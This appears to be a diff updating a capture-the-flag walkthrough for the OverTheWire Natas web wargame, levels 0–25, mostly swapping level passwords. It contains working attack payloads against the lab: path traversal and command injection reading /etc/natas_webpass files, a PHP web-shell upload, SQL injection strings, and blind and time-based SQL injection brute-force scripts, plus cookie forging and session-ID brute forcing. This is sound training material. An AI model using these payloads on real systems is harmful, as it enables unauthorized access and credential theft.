@@ -11,7 +11,7 @@ URL:      http://natas0.natas.labs.overthewire.org
 Looking at the full page source we can find the password at line 16.
 
 ```html
-<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
+<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
 ```
 
 # 1
@@ -24,7 +24,7 @@ URL:      http://natas1.natas.labs.overthewire.org
 Same as before, but just shift+right click on firefox.
 
 ```html
-<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
+<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
 ```
 
 # 2
@@ -39,7 +39,7 @@ There is nothing in this page except for `<img src="files/pixel.png">`. The imag
 ```
 # username:password
 ...
-natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
 ```
 
 # 3
@@ -57,7 +57,7 @@ The source code mentions `Not even Google will find it this time...` which means
 Checking s3cr3t directory you can use the same method as natas2 as it includes users.txt.
 
 ```
-natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 ```
 
 # 4
@@ -72,7 +72,7 @@ We get denied access when visiting the website, saying that `authorized users sh
 Normally you can use burpsuite, but i found a firefox addon called [Referer Modifier](https://addons.mozilla.org/en-US/firefox/addon/referer-modifier/) by Airtower that would let me set the referer as `http://natas5.natas.labs.overthewire.org/` on any website. When doing so we can finally see the password.
 
 ```
-Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK  
 ```
 
 # 5
@@ -85,7 +85,7 @@ URL:      http://natas5.natas.labs.overthewire.org
 It says we aren't logged in. There's no other way to log in. I checked for any stored data using a cookie editor addon such as [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/), and I found out that there is one boolean cookie named `loggedin` which is set to 0. I set it to 1 which means that I am now considered logged in after refreshing the page.
 
 ```
-Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 ```
 
 # 6
@@ -102,7 +102,7 @@ It asks us for a secret key. It also gives us the PHP source code of the checker
 Input that and we get the password.
 
 ```
-Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 
+Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS 
 ```
 
 # 7
@@ -115,7 +115,7 @@ URL:      http://natas7.natas.labs.overthewire.org
 The hint in the source code says `password for webuser natas8 is in /etc/natas_webpass/natas8` but going to that directory doesn't work. But clicking on the website buttons take you to `index.php?page=home` and `index.php?page=about` respectiely. So going to `index.php?page=/etc/natas_webpass/natas8` gives us the password.
 
 ```
-a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
 ```
 
 # 8
@@ -146,7 +146,7 @@ The function first encodes the secret key into base64, then reverses it, and fin
 Enter the key and you will get the password
 
 ```
-Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd 
+Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t 
 ```
 
 # 9
@@ -169,7 +169,7 @@ Basically all it does is return all the lines in dictionary.txt that partly cont
 ```
 Output:
 
-D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 ```
 
 # 10
@@ -182,7 +182,7 @@ URL:      http://natas10.natas.labs.overthewire.org
 I guess the filter is broken, because our previous solution still works: `. /etc/natas_webpass/natas11 #`
 
 ```
-1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
 ```
 
 # 11
@@ -192,7 +192,7 @@ Username: natas11
 URL:      http://natas11.natas.labs.overthewire.org
 ```
 
-The website stores a `data` cookie with the value `MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D`.
+The website stores a `data` cookie with the value `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.
 
 Looking at the source code, it seems that the cookie is actually an array that stores the background color `bgcolor` as well as `showpassword`, but interpreted in JSON text format. The text is run through the xor_encrypt function, which xor's every letter by a secret key text. The result is then coverted into base64 and stored as the cookie. 
 
@@ -207,7 +207,7 @@ The first thing we need to do however is get the key, we can do this by xoring t
 > ```php
 > <?php
 > $text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); 
-> $key = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D");
+> $key = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D");
 > $outText = '';
 > for ($i=0;$i<strlen($text);$i++) {
 >   $outText .= $text[$i] ^ $key[$i % strlen($key)];
@@ -217,12 +217,12 @@ The first thing we need to do however is get the key, we can do this by xoring t
 > ?>
 > ```
 
-The key repeats, so the result is actually `KNHL`. With this we can place the key accordingly to get a cookie with the value.
+The key repeats, so the result is actually `eDWo`. With this we can place the key accordingly to get a cookie with the value.
 
 > ```php
 > <?php
 > $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")); 
-> $key = "KNHL";
+> $key = "eDWo";
 > $outText = '';
 > for ($i=0;$i<strlen($text);$i++) {
 >   $outText .= $text[$i] ^ $key[$i % strlen($key)];
@@ -232,12 +232,12 @@ The key repeats, so the result is actually `KNHL`. With this we can place the ke
 > ?>
 > ```
 
-We get our new cookie! `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz`
+We get our new cookie! `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`
 
 Put this in your cookie editor and refresh the page.
 
 ```
-The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 ```
 
 # 12
@@ -253,14 +253,14 @@ What we should upload instead is a PHP file that lets us execute shell commands 
 
 However, it renames the file with a random string and puts .jpg in the end. Looking through the source code it seems that the new filename is generated when we visit the site, and is stored on the html at line 17.
 
-> `<input type="hidden" name="filename" value="uxt1svx2ok.jpg" />`
+> `<input type="hidden" name="filename" value="w01h6ubw9x.jpg" />`
 
-So all we have to do is inspect element and change the .jpg to .png.
+So all we have to do is inspect element and change the .jpg to .php.
 
 Once we upload the file, we can run the file by clicking the link. We can then add `?cmd=cat /etc/natas_webpass/natas13` after the file name to see the password.
 
 ```
-lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 ```
 
 # 13
@@ -283,7 +283,7 @@ The code now uses exif to check what file type it is. Basically checking the fir
 Once that's done, just follow the same steps as the previous level. Make sure you don't pick up the first four characters. (They may appear as a diamond with a question mark)
 
 ```
-���� qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP 
+���� z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ 
 ```
 
 # 14
@@ -297,10 +297,10 @@ The website is using SQL to get a username and password onto the website. Lookin
 
 > `SELECT * from users where username="(user)"and password="(pass)";`
 
-Since we can put anything on the input, you can just leave the username blank, and put `"  or "1"="1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.
+Since we can put anything on the input, you can just leave the username blank, and put `"  or "1" = "1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.
 
 ```
-Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 ```
 
 # 15
@@ -324,7 +324,7 @@ For the sake of time I just looked for other solutions for this level and took [
 >     'abcdefghijklmnopqrstuvwxyz' +
 >     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
-> webauth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
+> webauth = ('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
 > charset_1 = ''
 > for c in charset_0:
 >     username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
@@ -354,7 +354,7 @@ For the sake of time I just looked for other solutions for this level and took [
 Once that's done we get the password.
 
 ```
-TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
 ```
 
 # 16
@@ -364,7 +364,7 @@ Username: natas16
 URL:      http://natas16.natas.labs.overthewire.org
 ```
 
-So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello)helium`, it will end up being`hello helium`and return no result.
+So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello) helium`, it will end up being`hello helium`and return no result.
 
 Looks like we need to bruteforce again... so the command we will use is `(grep -E ^(pass).* /etc/natas_webpass/natas17)helium`. This lets us run a regex expression that runs successfully if the starting characters, `(pass)`, match the start of the password. If it does, it will return a blank message, but wrong characters will just return the words with helium.
 
@@ -378,7 +378,7 @@ I used the same python code from the previous level, but with some changes.
 >     'abcdefghijklmnopqrstuvwxyz' +
 >     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 > )
-> webauth = ('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
+> webauth = ('natas16','hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
 > charset_1 = ''
 > 
 > for c in charset_0:
@@ -403,13 +403,13 @@ I used the same python code from the previous level, but with some changes.
 >         if "helium" not in r.text:
 >             print ('PASS: ' + t.ljust(32, '*'))
 >             password = t
->             brea
+>             break
 > ```
 
 This is the password we get:
 
 ```
-XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
 
 # 17
@@ -419,7 +419,7 @@ Username: natas17
 URL:      http://natas17.natas.labs.overthewire.org
 ```
 
-This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.
+This is just natas15 but now it doesn't confirm if we got it right with the text. Both correct and incorrect usernames don't have anything to display. So we have to rely purely on SQL to brute force. One way we can do this is with the `sleep(secs)` command, so that if a string exists in the password then it will sleep for a number of seconds (We'll use two, but you can increase or decrease it if you want). The input will look like this: `natas16" AND password LIKE BINARY "(pass)&" AND sleep(2) #` You'll be waiting alot longer though. Here's the updated code.
 
 ```python
 import requests
@@ -429,7 +429,7 @@ charset_0 = (
     'abcdefghijklmnopqrstuvwxyz' +
     'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 )
-webauth = ('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
+webauth = ('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
 charset_1 = ''
 for c in charset_0:
     username = ('natas18" AND password LIKE BINARY "%' + c +'%" AND sleep(2) #')
@@ -459,7 +459,7 @@ while len(password) != 32:
 We got this password:
 
 ```
-8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 ```
 
 # 18
@@ -474,7 +474,7 @@ It looks like a login page where we need to be admin to get the password. Lookin
 ```python
 import requests
 target = 'http://natas18.natas.labs.overthewire.org'
-webauth = ('natas18','8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
+webauth = ('natas18','6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
 
 for uid in range(640):
     r = requests.get(target,
@@ -487,10 +487,10 @@ for uid in range(640):
         break
 ```
 
-The password we get in session id 281 is
+The password we get in session id 119 is
 
 ```
-8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 ```
 
 # 19
@@ -505,7 +505,7 @@ According to the website it is similar to the previous levels except the session
 ```python
 import requests
 target = 'http://natas19.natas.labs.overthewire.org'
-webauth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
+webauth = ('natas19','tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
 
 for uid in range(640):
     newid = (str(uid) + "-admin").encode("utf-8").hex()
@@ -522,7 +522,7 @@ for uid in range(640):
 We get this at ID: 281
 
 ```
-guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
 ```
 
 # 20
@@ -538,7 +538,7 @@ For this one it seems the cookie is completely random, but the source code chang
 You are an admin. The credentials for the next level are:
 
 Username: natas21
-Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 ```
 
 # 21
@@ -554,7 +554,7 @@ The main website doesn't do anything other than display the password if `admin` 
 You are an admin. The credentials for the next level are:
 
 Username: natas22
-Password: 91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
+Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
 ```
 
 # 22
@@ -564,11 +564,11 @@ Username: natas22
 URL:      http://natas22.natas.labs.overthewire.org
 ```
 
-This one was pretty simple.  All you need to do is pass `?revelio` into the URL. However it auto-redirects and doesn't show the password, so I used the curl command: `curl -i -u natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s http://natas22.natas.labs.overthewire.org/\?revelio`
+This one was pretty simple.  All you need to do is pass `?revelio` into the URL. However it auto-redirects and doesn't show the password, so I used the curl command: `curl -i -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz http://natas22.natas.labs.overthewire.org/\?revelio`
 
 ```
 You are an admin. The credentials for the next level are:<br><pre>Username: natas23
-Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj</pre>
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
 ```
 
 # 23
@@ -583,7 +583,7 @@ This is also pretty simple, it just checks if the given password has `iloveyou` 
 ```
 The credentials for the next level are:
 
-Username: natas24 Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+Username: natas24 Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
 ```
 
 # 24
@@ -645,15 +645,3 @@ After changing our user agent and accessing the log file, we get our password in
 Username: natas26
 URL:      http://natas26.natas.labs.overthewire.org
 ```
-
-
-
- 
-
-
-
-
-
-
-
-
